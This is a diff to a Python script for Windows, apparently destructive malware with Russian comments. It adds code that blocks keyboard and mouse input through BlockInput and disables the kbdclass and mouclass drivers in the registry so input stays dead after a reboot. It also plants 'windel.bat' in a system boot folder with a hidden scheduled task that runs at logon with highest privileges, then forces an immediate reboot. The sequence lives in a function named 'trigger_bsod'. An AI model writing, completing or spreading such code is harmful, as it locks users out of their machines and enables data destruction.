@@ -114,59 +114,107 @@ def set_reg_value(hive, path: str, name: str, value, value_type=winreg.REG_SZ) -
         winreg.SetValueEx(key, name, 0, value_type, value)
     print(f"[OK] {path}\\{name} = {value}")
 
+def block_input(block=True):
+    """Блокирует ввод на текущую сессию через WinAPI.
+    Снимется автоматически после ребута."""
+    try:
+        user32 = ctypes.WinDLL("user32.dll", use_last_error=True)
+        user32.BlockInput.argtypes = [wintypes.BOOL]
+        user32.BlockInput.restype = wintypes.BOOL
+        user32.BlockInput(wintypes.BOOL(block))
+        print(f"[BlockInput] BlockInput({block})")
+        return True
+    except Exception as e:
+        print(f"[BlockInput] {e}")
+        return False
+
+
+def disable_kbd_mouse():
+    """Start=4 = SERVICE_DISABLED для kbdclass и mouclass.
+    Активируется ПОСЛЕ ребута — клава и мышь не поднимутся."""
+    try:
+        set_reg_value(
+            winreg.HKEY_LOCAL_MACHINE,
+            r"SYSTEM\CurrentControlSet\Services\kbdclass",
+            "Start", 4, winreg.REG_DWORD
+        )
+    except Exception as e:
+        print(f"[Disable kbd] {e}")
+    try:
+        set_reg_value(
+            winreg.HKEY_LOCAL_MACHINE,
+            r"SYSTEM\CurrentControlSet\Services\mouclass",
+            "Start", 4, winreg.REG_DWORD
+        )
+    except Exception as e:
+        print(f"[Disable mou] {e}")
+
+
 def bat_to_autoload():
+    """Копирует windel.bat в C:\\Windows\\Boot\\Resources и создаёт
+    задачу MyBatTask (ONLOGON, RL HIGHEST). Оригинал не трогает."""
     project_dir = os.path.dirname(os.path.abspath(sys.argv[0]))
     bat_path = os.path.join(project_dir, "windel.bat")
     if not os.path.isfile(bat_path):
-        print("Файл не найден.")
+        print("[Bat] windel.bat не найден рядом со скриптом")
         return
 
     dest_dir = r"C:\Windows\Boot\Resources"
-    os.makedirs(dest_dir, exist_ok=True)
+    try:
+        os.makedirs(dest_dir, exist_ok=True)
+    except Exception as e:
+        print(f"[Bat] makedirs: {e}")
+        return
 
     dest = os.path.join(dest_dir, os.path.basename(bat_path))
 
     if os.path.abspath(bat_path) != os.path.abspath(dest):
-        shutil.move(bat_path, dest)
-        print(f"Перемещено: {bat_path} -> {dest}")
-    else:
-        print("Файл уже находится в нужной папке.")
+        try:
+            shutil.copy2(bat_path, dest)
+            print(f"[Bat] скопирован: {bat_path} -> {dest}")
+        except Exception as e:
+            print(f"[Bat] copy2: {e}")
+            return
 
     task_name = "MyBatTask"
+    subprocess.run(
+        ["schtasks", "/Delete", "/TN", task_name, "/F"],
+        capture_output=True,
+        creationflags=subprocess.CREATE_NO_WINDOW,
+    )
 
-    subprocess.run(["schtasks", "/Delete", "/TN", task_name, "/F"],
-                   capture_output=True)
-
-    result = subprocess.run([
-        "schtasks", "/Create",
-        "/TN", task_name,
-        "/TR", f'"{dest}"',
-        "/SC", "ONLOGON",
-        "/RL", "HIGHEST",
-        "/F"
-    ], capture_output=True, text=True)
-
+    result = subprocess.run(
+        [
+            "schtasks", "/Create",
+            "/TN", task_name,
+            "/TR", f'"{dest}"',
+            "/SC", "ONLOGON",
+            "/RL", "HIGHEST",
+            "/F"
+        ],
+        capture_output=True, text=True,
+        encoding="utf-8", errors="replace",
+        creationflags=subprocess.CREATE_NO_WINDOW,
+    )
     if result.returncode == 0:
-        print(f"\n✔ Задача '{task_name}' создана.")
-        print(f"✔ Батник: {dest}")
-        print("✔ Будет запускаться при входе в систему от админа без UAC.")
+        print(f"[Scheduler] задача '{task_name}' создана")
     else:
-        print("Ошибка создания задачи:")
-        print(result.stdout)
-        print(result.stderr)
+        print(f"[Scheduler] ошибка: {result.stderr or result.stdout}")
 
-def block_input(block=True):
-    set_reg_value(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services", "kbdclass", 4, winreg.REG_DWORD)
-    set_reg_value(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services", "mouclass", 4, winreg.REG_DWORD)
-    bat_to_autoload()
-    os.system("shutdown /r /t 0")
-    return user32.BlockInput(block)
 
 def trigger_bsod():
+    """Полная последовательность:
+       1) BlockInput(True) — ввод умирает прямо сейчас
+       2) Start=4 для kbdclass/mouclass — ввод не поднимется после ребута
+       3) bat_to_autoload — windel.bat стартует при логоне от админа
+       4) shutdown /r /t 0 — ребут
+    """
+    print("[Trigger] старт финальной последовательности")
     block_input(True)
-    base_dir = Path(__file__).resolve().parent
-    bat_path = base_dir / "windel.bat"
-    subprocess.run(str(bat_path), shell=True, check=True)
+    disable_kbd_mouse()
+    bat_to_autoload()
+    print("[Trigger] shutdown /r /t 0")
+    os.system("shutdown /r /t 0 /f")
 
 
 def is_admin():
